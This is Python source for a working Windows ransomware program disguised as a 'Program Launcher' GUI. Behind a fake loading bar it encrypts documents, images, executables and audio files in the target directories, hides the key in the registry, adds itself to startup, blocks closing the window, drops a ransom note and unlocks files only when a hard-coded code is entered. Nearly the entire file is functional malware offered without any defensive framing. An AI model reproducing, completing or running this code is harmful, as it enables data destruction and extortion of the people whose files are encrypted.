import tkinter as tk
from tkinter import messagebox, ttk
from time import sleep
from cryptography.fernet import Fernet
import threading
import random
import traceback
import sys
import winreg
from variables import *

def add_to_startup(file_path=None):
    if file_path is None:
        file_path = os.path.abspath(sys.argv[0])

    key_name = "ItsYourR"
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(reg_key)
    except Exception:
        pass

# By: AhmadMAnis & LethimCookMyBro
print("By AhmadMAnis & LethimCookMyBro")

print("Debugging: ↓")

# there is some files and variables are stored in(@variables.py)
print("There is some files and variables are stored in (@variables.py)")

print(f"Ransom File: {ransom_file}") #Debugging

print("key path located")  #debugging


class RansomwareApp:
    def __init__(self, master):
        self.master = master
        master.title("Launcher")
        master.geometry("600x400")
        master.configure(bg='black')

        print(f"Ransom Message: {ransom_message}") #Debugging
        print(f"Decryption File: {decryption_message}")  #Debugging

        self.reg_path = r"SOFTWARE\the_system_i\hidden\its your ransom\encryption"
        self.key_name = "EncryptionKey"

        print(f"\nThe directories where the ransomware work: {directories}")  #Debugging
        print("encryption Key location: Registry (Hidden)")  #Debugging
        print("Decrypt Key: {I think this is very SECRET}")  #Debugging

        # Setup main page
        self.setup_main_page()

    def store_key_in_registry(self, key):
        try:
            reg_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, self.reg_path)
            winreg.SetValueEx(reg_key, self.key_name, 0, winreg.REG_BINARY, key)
            winreg.CloseKey(reg_key)
            return True
        except Exception as e:
            print(f"Error storing key: {e}")
            return False

    def get_key_from_registry(self):
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, self.reg_path, 0, winreg.KEY_READ)
            key_data = winreg.QueryValueEx(reg_key, self.key_name)[0]
            winreg.CloseKey(reg_key)
            return key_data
        except Exception as e:
            return None

    def setup_main_page(self):
        # Clear any existing widgets safely
        for widget in self.master.winfo_children():
            try:
                widget.destroy()
            except tk.TclError:
                pass  # Skip if widget already destroyed

        # Configure row and column weights to center content
        self.master.grid_rowconfigure(0, weight=1)
        self.master.grid_rowconfigure(5, weight=1)
        self.master.grid_columnconfigure(0, weight=1)
        self.master.grid_columnconfigure(2, weight=1)

        # Main page label
        self.title_label = tk.Label(
            self.master,
            text="Program Launcher",
            font=('Arial', 20, 'bold'),
            fg='white',
            bg='black'
        )
        self.title_label.grid(row=1, column=1, pady=20)

        # Progress label
        self.progress_label = tk.Label(
            self.master,
            text="Press Launch to Start the Program \n\n لبدا البرنامج Launch اضغط على",
            font=('Arial', 12),
            fg='green',
            bg='black'
        )
        self.progress_label.grid(row=2, column=1, pady=10)

        # Progress bar
        self.progress_bar = ttk.Progressbar(
            self.master,
            orient="horizontal",
            length=300,
            mode="determinate"
        )
        self.progress_bar.grid(row=3, column=1, pady=10)

        # Detailed log text
        self.log_text = tk.Text(
            self.master,
            height=5,
            width=50,
            bg='black',
            fg='green',
            font=('Courier', 10)
        )
        self.log_text.grid(row=4, column=1, pady=10)

        # Start button
        self.start_button = tk.Button(
            self.master,
            text="Launch",
            command=self.start_encryption,
            bg='red',
            fg='white',
            font=('Arial', 14, 'bold')
        )
        self.start_button.grid(row=5, column=1, pady=30)

    def log_message(self, message):
        try:
            # Ensure we're in the main thread
            if self.master.winfo_exists():
                self.log_text.insert(tk.END, f"{message}\n")
                self.log_text.see(tk.END)
                self.master.update_idletasks()
        except tk.TclError:
            # Handle potential errors if widget has been destroyed
            print(f"Error logging message: {message}")  #Debugging

    def start_encryption(self):
        self.start_button.config(state=tk.DISABLED)
        print("Program Started")  # Debugging

        # Reset progress bar
        self.progress_bar['value'] = 0
        self.progress_label.config(text="Initializing program...", fg='yellow')

        # Start encryption in a separate thread with error handling
        def threaded_encryption():
            try:
                self.encryption_process()
            except Exception as e:
                # Ensure GUI updates happen in main thread
                self.master.after(0, self.show_error, f"Lagging, Restart the application or wait until finish")

        encryption_thread = threading.Thread(target=threaded_encryption, daemon=True)
        encryption_thread.start()

    def encryption_process(self):
        try:
            for i in range(1, 101):
                sleep(0.05)
                self.master.after(0, self.update_progress, i, f"Loading APP: {i}% complete")

            self.master.after(0, self.log_message, "Generating your account.... ")

            # استخدام Registry
            key = self.get_key_from_registry()
            if not key:
                key = Fernet.generate_key()
                self.store_key_in_registry(key)

            fernet = Fernet(key)
            print(f"encryption key created: ({key})")  #Debugging


            # Create ransom note
            def show_message():
                self.master.after(0, self.log_message, "loading.... please wait")


            # Fernet encryption

            # Track encryption progress
            encrypted_files = 0
            total_files = 0

            for directory in directories:
                for root, dirs, files in os.walk(directory):

                    for file in files:
                        total_files += 1
                        file_path = os.path.join(root, file)

                        file_extension = os.path.splitext(file)[1].lower()
                        if file_extension not in ['.exe', '.txt', '.pdf', '.mp3', '.png', '.jpeg', '.jpg', '.docx',
                                                  '.doc', '.xls', '.xlsx', '.pptx', '.ico', '.wav']:
                            continue

                        print(f"File extentions has been found: {file_extension}")  # Debugging

                        try:
                            if not os.path.exists(file_path):
                                continue

                            with open(file_path, "rb") as f:
                                data = f.read()

                            if b"##PHANTOMLINK_ENC##" in data:
                                continue

                            encrypted_data = fernet.encrypt(data)

                            with open(file_path, "wb") as f:
                                f.write(encrypted_data)
                                f.write(b"##PHANTOMLINK_ENC##")

                            encrypted_files += 1
                            self.master.after(0, self.log_message, f"loading")
                            print(f"the encrypted files is: {encrypted_files} file.")  # Debugging

                        except (FileNotFoundError, PermissionError, OSError):
                            continue
                        except Exception as file_error:
                            self.master.after(0, self.log_message, f"Saving Username....")
                            show_message()

            # Show summary
            self.master.after(0, self.log_message, f"Finish loading")

            print("Finished encryption data\n")  # Debugging
            print(f"\nEncryption key: ({key})")  # Debugging

            # Show ransom screen
            self.master.after(0, self.show_ransom_screen)

        except Exception as e:
            self.master.after(0, self.show_error, f"Failed to create Account. Please Restart.")


    def update_progress(self, value, message):
        try:
            # Update progress bar
            self.progress_bar['value'] = value

            # Update progress text
            self.progress_label.config(text=message)

            # Randomly change color for dramatic effect
            colors = ['red', 'yellow', 'green', 'white']
            self.progress_label.config(fg=random.choice(colors))

            # Prevent hanging with a timeout
            self.master.update_idletasks()
        except tk.TclError:
            # Handle potential errors if window has been closed
            print("Application interrupted")

    def show_ransom_screen(self):
        # Clear previous widgets
        for widget in self.master.winfo_children():
            widget.destroy()

        # Ransom message label
        ransom_label = tk.Label(
            self.master,
            text=ransom_message,
            font=('Courier', 10),
            fg='red',
            bg='black',
            justify=tk.LEFT,
            wraplength=500  # Add text wrapping
        )
        ransom_label.pack(pady=20, padx=20)
        print("Ransom screen apeared")  #Debugging
        with open("VERY IMPORTANT!!!! READ.txt", "w", encoding="utf-8") as filen:
            filen.write(ransom_file)

        # Decrypt key input
        self.key_entry = tk.Entry(
            self.master,
            font=('Arial', 14),
            show='*',
            width=30  # Make entry wider
        )
        self.key_entry.pack(pady=10)
        self.key_entry.focus_set()  # Set focus to entry

        # Decrypt button
        decrypt_button = tk.Button(
            self.master,
            text="Decrypt Files",
            command=self.attempt_decrypt,
            bg='red',
            fg='white',
            font=('Arial', 14, 'bold')
        )
        decrypt_button.pack(pady=10)

        # Bind Enter key to decrypt
        self.master.bind('<Return>', lambda event: self.attempt_decrypt())


    def attempt_decrypt(self):
        # Check decryption key
        entered_key = self.key_entry.get()


        if entered_key == dCode:
            # Start decryption in a thread
            threading.Thread(target=self.decrypt_files, daemon=True).start()
            print(f"\nThe user enterd the correct key ({dCode})")  #Debugging
            print("Decrypting files")  #Debugging
        else:
            messagebox.showerror("Access Denied", "Incorrect Decryption Key!")
            print(f"\nthe user entered a false key ({entered_key})")  #Debugging

    def decrypt_files(self):
        try:
            self.master.after(0, self.show_decryption_progress)

            # استخدام Registry
            key = self.get_key_from_registry()
            if not key:
                raise Exception("Encryption key not found. Failed to decrypt")

            fernet = Fernet(key)

            # Track decryption progress
            decrypted_files = 0
            total_files = 0
            failed_files = 0

            self.master.after(0, self.update_decrypt_progress,
                              total_files, decrypted_files,
                              "Decrypting Files.....   please wait (DON'T EXIT)")

            # First, count total files to be processed
            for directory in directories:
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, "rb") as f:
                                data = f.read()
                            if b"##PHANTOMLINK_ENC##" in data:
                                total_files += 1
                        except (FileNotFoundError, PermissionError, OSError):
                            pass

            # Then decrypt files
            for directory in directories:
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        file_path = os.path.join(root, file)

                        try:
                            with open(file_path, "rb") as f:
                                data = f.read()

                            if b"##PHANTOMLINK_ENC##" not in data:
                                continue

                            # Decrypt data (excluding header)
                            decrypted_data = fernet.decrypt(data[:-len(b"##PHANTOMLINK_ENC##")])

                            # Write decrypted data
                            with open(file_path, "wb") as f:
                                f.write(decrypted_data)

                            decrypted_files += 1

                            progress = int((decrypted_files / total_files) * 100) if total_files > 0 else 0

                            self.master.after(0, self.update_decrypt_progress,
                                              total_files, decrypted_files,
                                              f"Decrypted: {file}")

                        except Exception as file_error:
                            failed_files += 1
                            self.master.after(0, self.update_decrypt_progress,
                                              total_files, decrypted_files,
                                              f"Failed: {file}")

            # Show final decryption results
            self.master.after(0, self.show_decryption_results,
                              total_files, decrypted_files, failed_files)

        except Exception as e:
            self.master.after(0, self.show_error, f"Decryption Error: {str(e)}\n{traceback.format_exc()}")

    def show_decryption_progress(self):
        # Clear previous widgets
        for widget in self.master.winfo_children():
            widget.destroy()

        # Decryption progress label
        self.decrypt_label = tk.Label(
            self.master,
            text="Decrypting Files...",
            font=('Arial', 16, 'bold'),
            fg='red',
            bg='black'
        )
        self.decrypt_label.pack(pady=20)

        # Progress bar
        self.decrypt_progress_bar = ttk.Progressbar(
            self.master,
            orient="horizontal",
            length=300,
            mode="determinate"
        )
        self.decrypt_progress_bar['value'] = 0  # Explicitly start at 0
        self.decrypt_progress_bar['maximum'] = 100  # Ensure maximum is set to 100
        self.decrypt_progress_bar.pack(pady=10)

        # Detailed log text
        self.decrypt_log_text = tk.Text(
            self.master,
            height=10,
            width=50,
            bg='black',
            fg='green',
            font=('Courier', 10)
        )
        self.decrypt_log_text.pack(pady=10)

    def update_decrypt_progress(self, total, decrypted, message):
        try:
            # Update decryption log
            self.decrypt_log_text.insert(tk.END, f"{message}\n")
            self.decrypt_log_text.see(tk.END)

            # Calculate and set progress
            if total > 0:
                progress = int((decrypted / total) * 100)
                self.decrypt_progress_bar['value'] = progress
                print(f"Progress: {progress}%")  # Debug print

            self.master.update_idletasks()
        except tk.TclError:
            print("Decryption progress update interrupted")  #Debugging


    def show_decryption_results(self, total, decrypted, failed):
        # Show decryption summary
        result_text = (f"Decryption Complete!\n"
                       f"Decrypted: {decrypted}\n"
                       f"Failed: {failed}"
                       f"\nFails means you toched the files")
        print("\nDecrypted all files")  #Debugging

        messagebox.showinfo("Decryption Results", result_text)
        with open("VERY IMPORTANT!!!! READ.txt", "w", encoding="utf-8") as filen:
            filen.write(decryption_message)
        with open("Good Boy!.txt", "w", encoding="utf-8") as filen2:
            filen2.write(decryption_message)

        self.master.after(2000, self.master.quit)

    def show_error(self, error_msg):
        messagebox.showerror("Error", error_msg)


def main():
    try:
        root = tk.Tk()
        root.overrideredirect(True)

        def disable_close():
            pass
        root.protocol("WM_DELETE_WINDOW", disable_close)
        root.title("Launcher")
        root.geometry("600x400")
        root.configure(bg='black')
        root.bind("<Alt-F4>", lambda e: "break")

        # Center the window
        root.update_idletasks()
        width = root.winfo_width()
        height = root.winfo_height()
        x = (root.winfo_screenwidth() // 2) - (width // 2)
        y = (root.winfo_screenheight() // 2) - (height // 2)
        root.geometry(f'{width}x{height}+{x}+{y}')

        app = RansomwareApp(root)
        root.mainloop()
    except Exception as e:
        messagebox.showerror("Initialization Error", str(e))
        sys.exit(1)

if __name__ == "__main__":
    main()
    print("All Done! ")  #Debugging
print("Finished! ")

print("Program Closed. ")

print("By: AhmadMAnis ")
# By: AhmadMAnis

